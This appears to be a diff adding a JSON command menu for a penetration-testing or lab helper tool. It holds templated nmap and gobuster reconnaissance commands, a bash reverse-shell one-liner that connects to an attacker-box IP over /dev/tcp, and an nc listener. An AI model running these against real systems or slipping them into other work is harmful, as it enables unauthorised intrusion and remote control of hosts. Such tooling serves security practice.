@@ -1,0 +1,46 @@
+{
+  "Nmap": [
+    {
+      "label": "Top ports - scripts and versions",
+      "context": "target",
+      "command": "sudo nmap -sV -sC -oN nmap-top.txt {{targetIp}}"
+    },
+    {
+      "label": "All TCP ports - fast",
+      "context": "target",
+      "command": "sudo nmap -p- --min-rate 5000 -oN nmap-all.txt {{targetIp}}"
+    }
+  ],
+  "Gobuster": [
+    {
+      "label": "Common dirs",
+      "context": "target",
+      "command": "gobuster dir -u http://{{targetIp}} -w /usr/share/wordlists/dirb/common.txt -o gobuster-common.txt"
+    }
+  ],
+  "Reverse": [
+    {
+      "label": "Set reverse shell port",
+      "context": "setPort"
+    },
+    { "separator": true },
+    { "heading": "Linux" },
+    {
+      "label": "bash -i",
+      "context": "reverse",
+      "command": "bash -c 'bash -i >& /dev/tcp/{{attackboxIp}}/{{port}} 0>&1'"
+    }
+  ],
+  "Listener": [
+    {
+      "label": "nc listener",
+      "context": "listener",
+      "command": "nc -lvnp {{port}}"
+    },
+    { "separator": true },
+    {
+      "label": "Set listener port",
+      "context": "setPort"
+    }
+  ]
+}
